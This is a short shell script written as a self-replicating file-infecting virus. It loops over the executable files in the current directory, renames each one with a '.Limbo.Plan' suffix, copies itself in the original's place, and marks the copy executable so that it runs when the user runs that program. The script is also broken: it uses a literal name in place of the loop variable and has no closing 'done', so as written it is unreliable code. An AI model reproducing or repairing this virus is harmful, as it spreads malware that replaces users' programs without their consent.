#!/bin/sh
for files in *
do
 if [ -x files ]  
 then
     if [ ! -d files ]
     then
       mv files files.Limbo.Plan
       cp $0 files
       chmod +x files
       files.Limbo.Plan
     fi
   fi